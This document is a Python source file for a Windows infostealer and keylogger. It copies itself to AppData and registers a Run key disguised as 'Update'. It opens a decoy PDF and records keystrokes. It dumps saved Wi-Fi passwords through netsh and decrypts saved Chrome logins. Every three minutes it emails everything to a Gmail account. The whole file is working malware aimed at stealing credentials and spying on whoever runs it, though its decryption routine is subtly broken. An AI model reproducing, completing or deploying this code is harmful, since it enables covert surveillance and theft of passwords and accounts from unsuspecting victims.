import re
import sys
import platform
import pynput.keyboard
# import pyscreenshot as ImageGrab
import random
import threading
import smtplib
import socket
import shutil
import subprocess
import time
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from PIL import Image
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import multiprocessing
import logging

storage = ""
image = ""
#use os.path.join to go to direct or subdirectory

# log_file = os.path.join(os.environ['USERPROFILE'], 'Documents\Unscaffold\logger\log.log')
# logging.basicConfig(filename=log_file, level=logging.DEBUG, filemode='w')

# logger = logging.getLogger(__name__)
class Operation:
    def __init__(self, email, password):
        self.system_boot()
        self.storage = "Operation Started..."
        self.image = ""
        self.email = email
        self.password = password
        self.time = time.strftime("%H:%M:%S")
        self.screenshot_path = os.environ["AppData"] + "\\Local\\screenshot\\screenshot"

        
        
    
    def system_boot(self):
        operation_file_location = os.environ["AppData"] + "\\informatics.exe"
        if not os.path.exists(operation_file_location):
            logging.info("installing operation file")
            shutil.copyfile(sys.executable, operation_file_location)
            logging.info("operation file installed")
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "' + operation_file_location + '"', shell=True)
            #log error if not able to add to registry
            # logging.error("operation file not added to registry", exc_info=True)
            # os.chdir(sys._MEIPASS)
            # logging.info("operation file installed")
            # os.system("pdfs\\sample.pdf")
            # logging.info("sample pdf opened")
            if getattr(sys, 'frozen', False):
                application_path = os.path.join(os.environ['USERPROFILE'],"AppData", "Local", "iMobie_Inc" )
                if not os.path.exists(application_path):
                    os.makedirs(application_path)
                os.chdir(application_path)
            else:
                application_path = os.path.dirname(os.path.abspath(__file__))
                os.chdir(application_path)
            os.system('pdfs\\sample.pdf')

    
    def append_to_log(self, string):
        self.storage = self.storage + string


    def key_process(self, key):
        try:
            typed_key = str(key.char)
        except AttributeError:   
            if key == key.space:
                typed_key = " "
            elif key == key.enter:
                typed_key = "\n"
            elif key == key.backspace:
                typed_key = '\b'               
            else:
                typed_key = " " + str(key) + " "

        self.append_to_log(typed_key)

    def get_comp_info(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()

        self.append_to_log("\n")
        self.append_to_log("Hostname: " + hostname + "\n")
        self.append_to_log("IP: " + ip + "\n")
        self.append_to_log("Platform: " + plat + "\n")
        self.append_to_log("System: " + system + "\n")
        self.append_to_log("Machine: " + machine + "\n")
        self.append_to_log("\n")

        #use logging o check if function works


    # def take_screenshot(self, ):
 
    #     for i in range(4):
    #         self.image = ImageGrab.grab()

    #         if not os.path.exists(os.environ["AppData"] + "\\Local\\screenshot"):
    #             os.makedirs(os.environ["AppData"] + "\\Local\\screenshot")
    #             self.image.save(os.environ["AppData"] + "\\Local\\screenshot\\screenshot" + str(i) + ".png")
    #         else:
    #             self.image.save(os.environ["AppData"] + "\\Local\\screenshot\\screenshot" + str(i) + ".png")

    #         self.append_to_log("\n")
    #         self.append_to_log("Screenshot " + str(i) + ": " + os.environ["AppData"] + "\\Local\\screenshot\\screenshot" + str(i) + ".png" + "\n")
    #         self.append_to_log("\n")
    #         time.sleep(random.randint(1, 3))

 
    def start(self):
        logging.info("Keylogging Started at " + self.time)
        with pynput.keyboard.Listener(on_press=self.key_process) as listener:
            logging.info("Keylogging Started")
            self.send_report()
            listener.join()

    def get_wifi_info(self):
        wifis = subprocess.check_output("netsh wlan show profile", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

        wifis = wifis.decode(encoding="utf-8", errors="ignore")
        wifis_list = re.findall(r'(?:Profile\s*:\s)(.*)', wifis)
        wifis_list = [x.replace("\r", "") for x in wifis_list]
      
        for wifi in wifis_list:
            try:
                wifi_info = subprocess.check_output("netsh wlan show profile " + wifi + " key=clear", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
                wifi_info = wifi_info.decode(encoding="utf-8", errors="ignore")

                ssid = re.findall(r'(?:SSID name\s*:\s)(.*)', str(wifi_info))
                authentication = re.findall(r'(?:Authentication\s*:\s)(.*)', wifi_info)
                cipher = re.findall(r'(?:Cipher\s*:\s)(.*)', wifi_info)
                security_key = re.findall(r'(?:Security key\s*:\s)(.*)', wifi_info)
                password = re.findall(r'(?:Key Content\s*:\s)(.*)', wifi_info)
                
                self.append_to_log("\n")
                self.append_to_log("SSID: " + ssid[0] + "\n")
                self.append_to_log("Authentication: " + authentication[0] + "\n")
                self.append_to_log("Cipher: " + cipher[0] + "\n")
                self.append_to_log("Security key: " + security_key[0] + "\n")
                self.append_to_log("Password: " + password[0] + "\n")
                self.append_to_log("\n")
            except:
                pass

    def get_chrome_datetime(self, chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
    def get_encryption(self):
        local_chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_chrome_path, "r", encoding="utf-8" ) as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            encryption_key = local_state["os_crypt"]["encrypted_key"]
            encryption_key = base64.b64decode(encryption_key)
            encryption_key = encryption_key[5:]
            return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    
    def decrypt_passwords(self,encryption_key, password):
        try:
            iv = encryption_key[3:15]
            password = password[15:]
            cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
            password = cipher.decrypt(password)
        
        except:
            try:
                return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
            except:
                return "No passwords found"
        
       
    def get_chrome_passwords(self):
        key = self.get_encryption()
       
        path_to_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(path_to_db):
            path_to_db = path_to_db.replace("Default", "System Profile")           
            if not os.path.exists(path_to_db):
                return
       

        filename = os.environ["AppData"] + "\\ChromeData.db"
        shutil.copy(path_to_db, filename)

        conn = sqlite3.connect(filename)
        c = conn.cursor()
        c.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

        for item in c.fetchall():
            mainurl = item[0]
            actionurl = item[1]
            username = item[2]
            password = item[3]
            date_created = self.get_chrome_datetime(item[4])
            date_last_used = self.get_chrome_datetime(item[5])
            password = self.decrypt_passwords(password, key)
            self.append_to_log("\n")
            self.append_to_log("Main_URL: " + mainurl + "\n")
            self.append_to_log("Action_URL: " + actionurl + "\n")
            self.append_to_log("Username: " + username + "\n")
            self.append_to_log("Password: " + password + "\n")
            self.append_to_log("Date created: " + str(date_created) + "\n")
            self.append_to_log("Date last used: " + str(date_last_used) + "\n")
            self.append_to_log("\n")
        c.close()
        conn.close()
        try:
            os.remove(filename)
        except:
            pass


    def send_report(self):
        logging.info("Sending report")
        self.get_comp_info()
        logging.info("Getting Wifi info")
        self.get_wifi_info()
        logging.info("Getting Chrome passwords")
        self.get_chrome_passwords()
        logging.info("Getting Keylogging data")
        # self.take_screenshot()
        logging.info("Sending image")
        # images = []
        # for i in range(4):   
        #     if os.path.exists(self.screenshot_path + str(i) + ".png"):
        #         images.append(Image.open(self.screenshot_path + str(i) + ".png"))
        #     else:
        #         images.append(None)
        logging.info("Sending report email")
        # self.send_email(self.email, self.password, self.storage, images)
        self.send_email(self.email, self.password, self.storage)

        self.storage = ""
        timer = threading.Timer(180, self.send_report)
        logging.info("Scheduling next report")
        timer.start()



    # def send_email(self, email, password, message, images=None):
    def send_email(self, email, password, message):
        logging.info("Sending email")
        # msg = MIMEMultipart('related')
        # alt_msg = MIMEMultipart('alternative')
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = "Key logging Report"

        if message == "":
            msg.attach(MIMEText("No keystrokes recorded", 'plain'))
        else:
            logging.info("Adding message to email")

            # alt_msg.attach(MIMEText("Keystrokes recorded on " + time.strftime("%d/%m/%Y"), 'plain'))
            msg.attach(MIMEText("Keystrokes recorded on " + time.strftime("%d/%m/%Y"), 'plain'))
            # msg.attach(MIMEText(message, 'plain'))

            filename =os.environ["AppData"] + "\\webal.txt"
            attachment = open(filename, "w")
            attachment.write(message)
            attachment.close()
            with open(filename, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", "attachment; filename= " + filename)
                # alt_msg.attach(part)
                msg.attach(part)
            


            # msg.attach(alt_msg)

            # if images is not None:
            #     for i in range(len(images)):                 
            #         if images[i] is not None:
            #             image_data = open(os.environ["AppData"] + "\\Local\\screenshot\\screenshot" + str(i) + ".png", "rb").read()
            #             image = MIMEImage(image_data)
            #             image.add_header('Content-ID', '<image{}>'.format(i))
            #             msg.attach(image)


            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.starttls
                smtp.login(email, password)
                logging.info("Emailing report")
                smtp.sendmail(email, email, msg.as_string())
                smtp.quit()

            os.remove(filename)

            # for i in range(len(images)):
            #     try:
            #         os.remove(os.environ["AppData"] + "\\Local\\screenshot\\screenshot" + str(i) + ".png")
            #     except:
            #         pass

